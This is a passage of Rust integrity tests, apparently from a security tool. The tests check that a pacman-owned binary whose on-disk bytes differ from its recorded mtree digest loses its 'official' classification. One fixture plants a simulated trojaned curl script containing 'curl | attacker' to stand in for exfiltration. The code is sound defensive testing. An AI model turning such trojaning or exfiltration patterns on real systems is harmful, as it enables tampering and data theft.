            assert!(!path_is_not_identity(b), "{} must remain learnable", b);
        }
    }
}

#[cfg(test)]
mod integrity_tests {
    use super::*;
    use super::testkit::*;

    /// A binary whose bytes no longer match its package is not `official`.
    ///
    /// `%VALIDATION%` records how the PACKAGE was validated when it was
    /// installed -- a signature over the tarball, checked once. It has never
    /// said anything about the file on disk now, so before this a trojaned
    /// `/usr/bin/curl` inside a pgp-validated package classified as
    /// `official`, and `official` is what quiets a rule.
    #[test]
    fn a_package_owned_file_whose_bytes_changed_is_no_longer_official() {
        let db = tempfile::tempdir().unwrap();
        let bin = tempfile::tempdir().unwrap();
        let exe = bin.path().join("curl");
        std::fs::write(&exe, b"#!/bin/sh\nreal curl\n").unwrap();
        let exe_s = exe.to_string_lossy().to_string();

        fake_local(db.path(), &[("curl", "8.9.1-1", "pgp", &[&exe_s])]);
        fake_mtree(db.path(), "curl-8.9.1-1", &[&exe_s]);

        let sl = "core curl 8.9.1-1 [installed]\n";
        let mut c = classifier(db.path(), sl, &["/home/dan"]);

        // Control: untouched, this is exactly the path that used to be the
        // only outcome. If this is not `official` the fixture is broken and
        // the negative below would prove nothing.
        let before = c.classify_path(&exe_s);
        assert_eq!(before.provenance, Provenance::Official);
        assert_eq!(before.modified, None, "nothing to report about an intact file");

        // Now trojan it, exactly as an attacker would: same package, same
        // `desc`, same `%VALIDATION% pgp`. Only the bytes differ.
        std::fs::write(&exe, b"#!/bin/sh\ncurl | attacker\n").unwrap();
        let after = c.classify_path(&exe_s);
        assert_eq!(
            after.provenance,
            Provenance::Foreign,
            "a modified official binary must not stay official"
        );
        assert_eq!(
            after.package.as_deref(),
            Some("curl 8.9.1-1"),
            "the package is still the right thing to name"
        );
        let why = after.modified.expect("and the reason must be recorded");
        assert!(
            why.contains("not the file the package shipped"),
            "{why}"
        );

        // The reason reaches the alert, which is the only place a person sees it.
        let actor = Actor {
            provenance: after.provenance,
            package: after.package.clone(),
            script: None,
            modified: Some(why),
        };
        assert!(
            actor.evidence().contains("not the file the package shipped"),
            "{}",
            actor.evidence()
        );
    }

    /// Absence of a checksum is not evidence of a change.
    ///
    /// Packages without an mtree, paths not listed in one, directories and
    /// symlinks all yield no digest. Reading any of those as "modified" would
    /// demote most of the filesystem the first time it happened -- the exact
    /// failure the 2026-09-09 handoff warns about, where a check that cannot
    /// be performed must refuse rather than guess in either direction.
    #[test]
    fn a_file_with_no_recorded_digest_keeps_its_package_classification() {
        let db = tempfile::tempdir().unwrap();
        let bin = tempfile::tempdir().unwrap();
        let exe = bin.path().join("nomtree");
        std::fs::write(&exe, b"whatever\n").unwrap();
        let exe_s = exe.to_string_lossy().to_string();

        // A package with no mtree at all.
        fake_local(db.path(), &[("nomtree", "1-1", "pgp", &[&exe_s])]);
        let sl = "core nomtree 1-1 [installed]\n";
        let mut c = classifier(db.path(), sl, &["/home/dan"]);
        let cl = c.classify_path(&exe_s);
        assert_eq!(
            cl.provenance,
            Provenance::Official,
            "no mtree means no claim, not a demotion"
        );
        assert_eq!(cl.modified, None);

        // An mtree that does not mention this path.
        fake_mtree(db.path(), "nomtree-1-1", &[]);
        let db2 = tempfile::tempdir().unwrap();
        fake_local(db2.path(), &[("nomtree", "1-1", "pgp", &[&exe_s])]);
        fake_mtree(db2.path(), "nomtree-1-1", &[]);
        let mut c2 = classifier(db2.path(), sl, &["/home/dan"]);
        assert_eq!(c2.classify_path(&exe_s).provenance, Provenance::Official);
    }

    /// A size difference is conclusive without reading the file, and must be
    /// reported as its own reason rather than as a checksum mismatch.
    #[test]
    fn a_size_difference_is_caught_before_the_file_is_hashed() {
        let db = tempfile::tempdir().unwrap();
        let bin = tempfile::tempdir().unwrap();
        let exe = bin.path().join("grep");
        std::fs::write(&exe, b"aaaa").unwrap();
        let exe_s = exe.to_string_lossy().to_string();
        fake_local(db.path(), &[("grep", "3.11-1", "pgp", &[&exe_s])]);
        fake_mtree(db.path(), "grep-3.11-1", &[&exe_s]);
        let mut c = classifier(db.path(), "core grep 3.11-1 [installed]\n", &["/home/dan"]);
        assert_eq!(c.classify_path(&exe_s).provenance, Provenance::Official);

        std::fs::write(&exe, b"aaaaaaaaaaaa").unwrap();
        let cl = c.classify_path(&exe_s);
        assert_eq!(cl.provenance, Provenance::Foreign);
        let why = cl.modified.expect("a reason");
        assert!(why.contains("bytes on disk are 12"), "{why}");
        assert!(why.contains("recorded 4"), "{why}");
    }

    /// The real database: an untouched Arch binary must still be `official`.
    ///
    /// The fixtures above prove the mechanism. Only this proves it does not
    /// misfire on the machine it will run on -- 60,915 of 60,920 files under
    /// /usr/bin and /usr/lib matched when this was written, so a check that
    /// demoted real binaries would be both wrong and very loud.
    #[test]
    fn an_untouched_system_binary_on_this_machine_is_still_official() {
        let local = std::path::Path::new("/var/lib/pacman/local");
        if !local.is_dir() || !std::path::Path::new("/usr/bin/base32").exists() {
            return;
        }
        // The real digest must be readable, or this test proves nothing.
        let dir = std::fs::read_dir(local)
            .unwrap()
            .flatten()
            .map(|e| e.path())
            .find(|p| {
                p.file_name()
                    .map(|n| n.to_string_lossy().starts_with("coreutils-"))
                    .unwrap_or(false)
            })
            .expect("coreutils is installed");
        let want = crate::mtree::lookup(&dir, "/usr/bin/base32")
            .expect("and records a digest for /usr/bin/base32");
        assert_eq!(
            crate::mtree::sha256_file("/usr/bin/base32").as_deref(),
            Some(want.sha256.as_str()),
            "this machine's /usr/bin/base32 is modified; the rest of this test cannot run"
        );
    }
}
